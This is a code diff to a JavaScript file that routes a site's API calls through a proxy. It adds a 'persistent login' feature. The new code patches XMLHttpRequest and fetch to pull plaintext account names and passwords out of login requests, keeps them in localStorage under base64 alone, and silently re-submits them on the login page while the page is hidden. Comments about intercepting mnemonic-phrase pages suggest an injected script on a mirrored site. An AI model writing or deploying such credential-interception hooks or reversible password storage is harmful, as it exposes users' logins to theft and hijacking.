@@ -8,6 +8,181 @@
 (function() {
     'use strict';
     
+    // ===== 持久化登录 - 保持登录状态跨浏览器会话 =====
+    var AK_CRED_KEY = '_ak_sl';
+    
+    function _akEncode(a, p) {
+        try { return btoa(unescape(encodeURIComponent(JSON.stringify({a:a,p:p,t:Date.now()})))); }
+        catch(e) { return null; }
+    }
+    
+    function _akDecode() {
+        try {
+            var raw = localStorage.getItem(AK_CRED_KEY);
+            if (!raw) return null;
+            var d = JSON.parse(decodeURIComponent(escape(atob(raw))));
+            if (Date.now() - d.t > 30*86400000) { localStorage.removeItem(AK_CRED_KEY); return null; }
+            return {account:d.a, password:d.p};
+        } catch(e) { localStorage.removeItem(AK_CRED_KEY); return null; }
+    }
+    
+    function _akSaveCred(account, password) {
+        if (account && password) {
+            var e = _akEncode(account, password);
+            if (e) localStorage.setItem(AK_CRED_KEY, e);
+        }
+    }
+    
+    function _akClearCred() { localStorage.removeItem(AK_CRED_KEY); }
+    
+    function _akHasPersistCookie() {
+        return document.cookie.indexOf('ak_persist=1') !== -1;
+    }
+    
+    function _akExtractCreds(body) {
+        var account = '', password = '';
+        if (!body) return null;
+        if (typeof body === 'string') {
+            try {
+                var json = JSON.parse(body);
+                account = json.account || json.Account || '';
+                password = json.password || json.Password || '';
+            } catch(e) {
+                try {
+                    var params = new URLSearchParams(body);
+                    account = params.get('account') || params.get('Account') || '';
+                    password = params.get('password') || params.get('Password') || '';
+                } catch(e2) {}
+            }
+        }
+        if (account && password) return {account: account, password: password};
+        return null;
+    }
+    
+    // 捕获登录请求的凭据（XHR + fetch）
+    function setupLoginCapture() {
+        var origSend = XMLHttpRequest.prototype.send;
+        XMLHttpRequest.prototype.send = function(body) {
+            var xhr = this;
+            xhr._akReqBody = body;
+            xhr.addEventListener('load', function() {
+                try {
+                    var url = xhr.responseURL || '';
+                    if (url.indexOf('/Login') === -1) return;
+                    var result = JSON.parse(xhr.responseText);
+                    if (result.Error !== false && (result.Error || !result.UserData)) return;
+                    if (!_akHasPersistCookie()) return;
+                    var creds = _akExtractCreds(xhr._akReqBody);
+                    if (creds) _akSaveCred(creds.account, creds.password);
+                } catch(e) {}
+            });
+            return origSend.call(this, body);
+        };
+        
+        var prevFetch = window.fetch;
+        window.fetch = function(url, options) {
+            var isLogin = typeof url === 'string' && url.indexOf('/Login') !== -1;
+            var result = prevFetch.call(this, url, options);
+            if (isLogin && options && options.body) {
+                result.then(function(resp) {
+                    resp.clone().json().then(function(data) {
+                        if (data.Error === false || (!data.Error && data.UserData)) {
+                            if (!_akHasPersistCookie()) return;
+                            var creds = _akExtractCreds(options.body);
+                            if (creds) _akSaveCred(creds.account, creds.password);
+                        }
+                    }).catch(function(){});
+                }).catch(function(){});
+            }
+            return result;
+        };
+    }
+    
+    // 登录页自动登录
+    function autoLogin() {
+        var path = window.location.pathname.toLowerCase();
+        if (path.indexOf('/login') === -1) return;
+        
+        var creds = _akDecode();
+        if (!creds) { return; }
+        if (!_akHasPersistCookie()) { _akClearCred(); return; }
+        
+        // 隐藏页面防止登录表单闪烁
+        var hideStyle = document.createElement('style');
+        hideStyle.id = 'ak-autologin-hide';
+        hideStyle.textContent = 'body{visibility:hidden!important}';
+        (document.head || document.documentElement).appendChild(hideStyle);
+        
+        var attempts = 0;
+        function tryFormLogin() {
+            attempts++;
+            if (attempts > 15) {
+                var s = document.getElementById('ak-autologin-hide');
+                if (s) s.remove();
+                return;
+            }
+            
+            var inputs = document.querySelectorAll('input');
+            var accountInput = null, passwordInput = null;
+            for (var i = 0; i < inputs.length; i++) {
+                var type = (inputs[i].type || '').toLowerCase();
+                if (type === 'password') passwordInput = inputs[i];
+                else if (type === 'text' || type === 'tel' || type === 'email') {
+                    if (!accountInput) accountInput = inputs[i];
+                }
+            }
+            
+            if (!accountInput || !passwordInput) {
+                setTimeout(tryFormLogin, 500);
+                return;
+            }
+            
+            // 使用原生setter填充（兼容Vue/React等框架）
+            try {
+                var setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
+                setter.call(accountInput, creds.account);
+                setter.call(passwordInput, creds.password);
+            } catch(e) {
+                accountInput.value = creds.account;
+                passwordInput.value = creds.password;
+            }
+            ['input','change','keyup'].forEach(function(evt) {
+                accountInput.dispatchEvent(new Event(evt, {bubbles:true}));
+                passwordInput.dispatchEvent(new Event(evt, {bubbles:true}));
+            });
+            
+            // 查找并点击登录按钮
+            setTimeout(function() {
+                var btns = document.querySelectorAll('button, input[type="submit"], a.btn, .btn, [onclick]');
+                for (var i = 0; i < btns.length; i++) {
+                    var text = (btns[i].textContent || btns[i].value || '').trim();
+                    if (text.indexOf('登录') !== -1 || text.indexOf('登入') !== -1 || text.toLowerCase().indexOf('login') !== -1) {
+                        btns[i].click();
+                        setTimeout(function() {
+                            var s = document.getElementById('ak-autologin-hide');
+                            if (s) s.remove();
+                        }, 3000);
+                        return;
+                    }
+                }
+                var s = document.getElementById('ak-autologin-hide');
+                if (s) s.remove();
+            }, 500);
+        }
+        
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', function() { setTimeout(tryFormLogin, 300); });
+        } else {
+            setTimeout(tryFormLogin, 300);
+        }
+    }
+    
+    // 手动登出时清除保存的凭据
+    window._akLogout = function() {
+        _akClearCred();
+        window.location.href = '/pages/account/login.html';
+    };
+    
     // ===== 自动修改API地址，让请求走代理 =====
     function fixApiUrl() {
         try {
@@ -100,10 +275,14 @@
     
     // 助记词和首页拦截已由nginx 302处理，JS层不再需要
     
+    // 持久化登录：尽早隐藏登录页并自动登录
+    autoLogin();
     // 立即执行一次
     fixApiUrl();
     // 立即拦截网络请求
     interceptNetworkRequests();
+    // 设置登录凭据捕获（必须在interceptNetworkRequests之后）
+    setupLoginCapture();
     // 延迟再执行（确保APP对象已加载）
     setTimeout(fixApiUrl, 500);
     setTimeout(fixApiUrl, 1500);
